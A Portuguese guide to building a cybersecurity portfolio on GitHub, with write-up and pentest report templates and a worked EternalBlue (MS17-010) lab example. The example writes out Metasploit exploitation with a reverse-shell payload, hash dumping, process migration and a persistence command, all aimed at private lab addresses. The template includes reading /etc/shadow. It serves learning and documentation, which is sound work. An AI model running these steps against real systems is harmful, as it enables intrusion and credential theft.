# 🛡️ Guia Completo: Portfólio de Cibersegurança no GitHub

> Baseado em ambiente de laboratório: Kali Linux, Metasploitable 2, Windows Server, Ubuntu

---

## 📁 Estrutura Recomendada do Repositório

```
cybersecurity-portfolio/
│
├── README.md                          # Visão geral do portfólio
├── LICENSE                            # MIT (recomendado)
│
├── 00-lab-environment/                # Documentação do seu ambiente
│   ├── network-diagram.md
│   ├── vm-configurations.md
│   └── tools-installed.md
│
├── 01-writeups/                       # Write-ups de máquinas e CTFs
│   ├── metasploitable2/
│   │   ├── README.md
│   │   ├── 01-reconnaissance.md
│   │   ├── 02-vulnerability-analysis.md
│   │   ├── 03-exploitation.md
│   │   ├── 04-post-exploitation.md
│   │   └── 05-remediation.md
│   ├── hackthebox/
│   │   └── [maquina]-[dificuldade].md
│   ├── tryhackme/
│   │   └── [sala]/
│   └── vulnhub/
│       └── [maquina]/
│
├── 02-pentest-reports/                # Relatórios formais de pentest
│   ├── internal-lab-pentest.md
│   └── report-template.md
│
├── 03-scripts-automation/             # Scripts próprios
│   ├── recon/
│   ├── exploitation/
│   ├── post-exploitation/
│   └── hardening/
│
├── 04-cheatsheets/                    # Anotações rápidas para estudo
│   ├── nmap.md
│   ├── metasploit.md
│   ├── privilege-escalation-linux.md
│   ├── privilege-escalation-windows.md
│   ├── forense.md
│   └── wireshark.md
│
├── 05-certifications-roadmap/         # Estudo para certificações
│   ├── comptia-security-plus/
│   ├── ecppt/
│   ├── oscp/
│   └── ceh/
│
└── 06-resources/                      # Links, livros, cursos
    ├── books.md
    ├── courses.md
    └── youtube-channels.md
```

---

## 📝 Template de Write-Up (Máquina/Lab)

Use este template para cada máquina que você explorar. Salve como `README.md` dentro da pasta da máquina.

```markdown
# [Nome da Máquina/Lab]

**Data:** DD/MM/AAAA  
**Plataforma:** [Hack The Box / TryHackMe / VulnHub / Lab Próprio]  
**Dificuldade:** [Fácil / Médio / Difícil / Insane]  
**Tipo:** [Linux / Windows]  
**Técnicas Principais:** [Enumeração, SQL Injection, Buffer Overflow, etc.]

---

## 📋 Índice
1. [Reconhecimento](#1-reconhecimento)
2. [Análise de Vulnerabilidades](#2-análise-de-vulnerabilidades)
3. [Exploração](#3-exploração)
4. [Pós-Exploração](#4-pós-exploração)
5. [Escalação de Privilégios](#5-escalação-de-privilégios)
6. [Provas de Comprometimento](#6-provas-de-comprometimento)
7. [Remediação](#7-remediação)
8. [Lições Aprendidas](#8-lições-aprendidas)

---

## 1. Reconhecimento

### 1.1 Host Discovery
```bash
# Comando utilizado
nmap -sn 192.168.56.0/24
```

**Resultado:**
- IP alvo identificado: `192.168.56.10`

### 1.2 Port Scanning
```bash
# Scan completo de portas
nmap -p- --min-rate 1000 -T4 192.168.56.10 -oN nmap/all-ports.txt

# Scan detalhado nas portas abertas
nmap -sC -sV -p 22,80,445,3306 192.168.56.10 -oN nmap/detailed.txt
```

**Portas Abertas:**
| Porta | Serviço | Versão |
|-------|---------|--------|
| 22    | SSH     | OpenSSH 7.4 |
| 80    | HTTP    | Apache 2.4.10 |
| 445   | SMB     | Samba 4.3.11 |
| 3306  | MySQL   | MySQL 5.5 |

### 1.3 Enumeração de Serviços

#### SMB
```bash
enum4linux -a 192.168.56.10
smbclient -L \\192.168.56.10
```

**Achados:**
- Share `anonymous` acessível sem credenciais
- Arquivo `users.txt` encontrado

#### HTTP
```bash
gobuster dir -u http://192.168.56.10 -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
nikto -h http://192.168.56.10
```

**Achados:**
- Diretório `/admin` exposto
- Versão do Apache desatualizada

---

## 2. Análise de Vulnerabilidades

### Vulnerabilidade 1: [CVE-XXXX-XXXX / Nome]
- **Serviço Afetado:** [Serviço]
- **Severidade:** [Crítica / Alta / Média / Baixa]
- **Descrição:** Breve descrição da vulnerabilidade
- **Referência:** [Link para CVE, exploit-db, etc.]

### Vulnerabilidade 2: [...]

---

## 3. Exploração

### Exploit Utilizado: [Nome do Exploit]

```bash
# Passo a passo completo
msfconsole
use exploit/[caminho]
set RHOSTS 192.168.56.10
set PAYLOAD [payload]
set LHOST 192.168.56.5
exploit
```

**Resultado:**
- Shell obtido como usuário `www-data` / `NT AUTHORITY\SYSTEM`
- Screenshot do shell: `[incluir screenshot]`

---

## 4. Pós-Exploração

### 4.1 Enumeração Interna
```bash
# Linux
whoami
id
uname -a
cat /etc/passwd
cat /etc/shadow (se possível)
find / -perm -4000 2>/dev/null

# Windows
whoami /all
systeminfo
net user
net localgroup administrators
```

### 4.2 Dados Sensíveis Encontrados
- [ ] Credenciais em texto plano
- [ ] Chaves SSH
- [ ] Arquivos de configuração
- [ ] Banco de dados

---

## 5. Escalação de Privilégios

### Vetor de Escalonamento
```bash
# Comando ou técnica utilizada
# Ex: Kernel exploit, SUID binary, misconfigured sudo, token impersonation
```

**Resultado:**
- De `www-data` para `root` / De `user` para `SYSTEM`
- Método: [Descrever]

---

## 6. Provas de Comprometimento

> ⚠️ **IMPORTANTE:** Em ambientes reais, nunca publique dados sensíveis de clientes. Em labs, ofusque hashes e senhas.

- [ ] Screenshot do shell com `whoami`
- [ ] Screenshot do arquivo `root.txt` / `flag.txt`
- [ ] Hash do usuário (ofuscado): `root:$6$xxxxx...:[OFUSCADO]`
- [ ] Flag encontrada: `HTB{...}` (se CTF)

---

## 7. Remediação

| Vulnerabilidade | Recomendação | Prioridade |
|-----------------|--------------|------------|
| [Nome] | [Ação corretiva] | [Alta/Média/Baixa] |

---

## 8. Lições Aprendidas

- O que funcionou bem?
- O que você perdeu tempo?
- Qual ferramenta ou técnica você aprendeu?
- O que faria diferente na próxima vez?

---

## 🔗 Referências
- [Link 1]
- [Link 2]
```

---

## 🖥️ Exemplo Prático: EternalBlue no seu Windows Server

Aqui está um exemplo de como documentar a exploração do EternalBlue (MS17-010) que você já realizou:

```markdown
# MS17-010 - EternalBlue Exploitation (Lab Interno)

**Data:** 27/07/2026  
**Alvo:** Windows Server 2012 R2 (192.168.56.20)  
**Atacante:** Kali Linux (192.168.56.5)  
**Objetivo:** Demonstrar impacto da vulnerabilidade MS17-010 e praticar pós-exploração

---

## 1. Reconhecimento

```bash
nmap -p445 --script smb-vuln-ms17-010 192.168.56.20
```

**Resultado:**
```
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE to MS17-010 (EternalBlue)
|   State: VULNERABLE
|   IDs:  CVE:CVE-2017-0144
```

## 2. Exploração com Metasploit

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.20
set LHOST 192.168.56.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

**Resultado:**
- Meterpreter session aberta como `NT AUTHORITY\SYSTEM`
- Privilégios máximos obtidos diretamente

## 3. Pós-Exploração

```bash
# Enumerar usuários
meterpreter > shell
C:\Windows\system32> net user
C:\Windows\system32> net localgroup administrators

# Capturar hash NTLM
meterpreter > hashdump

# Migrar para processo estável
meterpreter > ps
meterpreter > migrate [PID do explorer.exe]

# Persistência (para estudo apenas)
meterpreter > run persistence -U -i 5 -p 4445 -r 192.168.56.5
```

## 4. Remediação

- **Ação Imediata:** Aplicar patch KB4013389 da Microsoft
- **Firewall:** Bloquear SMB (porta 445) na borda da rede
- **Segmentação:** Isolar sistemas legados que não podem ser patchados
- **Monitoramento:** Habilitar logs de autenticação SMB e usar IDS/IPS

## 5. Lições Aprendidas

- EternalBlue explora a falha no protocolo SMBv1. Desativar SMBv1 elimina o vetor.
- A migração de processo no Meterpreter é essencial para manter a sessão estável.
- Mesmo em 2026, muitos sistemas legados ainda são vulneráveis — por isso a importância do inventário de ativos.
```

---

## 📊 Template de Relatório de Pentest Formal

Para quando você quiser simular um relatório profissional:

```markdown
# Relatório de Teste de Intrusão - [Nome do Lab]

**Cliente:** Lab de Estudos Interno  
**Período:** DD/MM/AAAA a DD/MM/AAAA  
**Consultor:** [Seu Nome]  
**Classificação:** CONFIDENCIAL

---

## 1. Executive Summary

Resumo executivo em 3-4 parágrafos para gestores. Foco em:
- O que foi testado
- Principais achados (quantidade e severidade)
- Recomendação geral

## 2. Metodologia

- **Framework:** PTES (Penetration Testing Execution Standard) / OWASP
- **Fases:** Reconhecimento → Enumeração → Exploração → Pós-Exploração → Relatório
- **Ferramentas:** Nmap, Metasploit, Burp Suite, etc.

## 3. Achados Detalhados

### ACHADO-001: [Título da Vulnerabilidade]
- **Severidade:** 🔴 Crítica / 🟠 Alta / 🟡 Média / 🟢 Baixa
- **CVSS v3.1:** [Score]
- **Descrição:**
- **Evidência:** [Screenshot + comando]
- **Impacto:**
- **Recomendação:**
- **Referências:**

## 4. Matriz de Risco

| ID | Vulnerabilidade | Probabilidade | Impacto | Risco |
|----|-----------------|---------------|---------|-------|
| 001 | EternalBlue | Alta | Crítico | 🔴 Crítico |

## 5. Roadmap de Remediação

| Prioridade | Ação | Responsável | Prazo |
|------------|------|-------------|-------|
| 1 | Aplicar patches críticos | TI | 7 dias |

## 6. Anexos
- Evidências completas
- Logs de comandos
- Scripts utilizados
```

---

## 🛠️ Dicas para manter o portfólio profissional

1. **README.md principal impressionante**
   - Use badges (TryHackMe rank, Hack The Box rank, certificações)
   - Inclua uma breve bio e objetivos de carreira
   - Liste as tecnologias que domina

2. **Commits frequentes**
   - Documente enquanto estuda, não deixe acumular
   - Commits claros: `add: writeup metasploitable2 samba exploit`

3. **Screenshots organizadas**
   - Crie uma pasta `assets/` ou `images/` em cada write-up
   - Nomeie bem: `01-nmap-scan.png`, `02-meterpreter-shell.png`

4. **Ofusque dados sensíveis**
   - Nunca publique IPs reais, senhas reais, ou dados de clientes
   - Em labs, ofusque hashes parcialmente

5. **Inclua o que DEU ERRADO**
   - Recrutadores valorizam quem mostra o processo de troubleshooting
   - "Tentei exploit X, não funcionou porque Y, então usei Z"

6. **Mantenha um CHANGELOG.md**
   - Registro de máquinas concluídas por mês
   - Certificações obtidas
   - Cursos finalizados

---

## 🚀 Próximos Passos Imediatos

1. Crie o repositório no GitHub com a estrutura acima
2. Comece documentando seu ambiente de lab em `00-lab-environment/`
3. Escreva o write-up do EternalBlue que você já fez
4. Documente cada máquina do Metasploitable 2 que você explorar
5. Adicione um `README.md` bonito na raiz com badges e introdução

---

*Portfólio criado para fins educacionais e demonstração de habilidades em cibersegurança.*
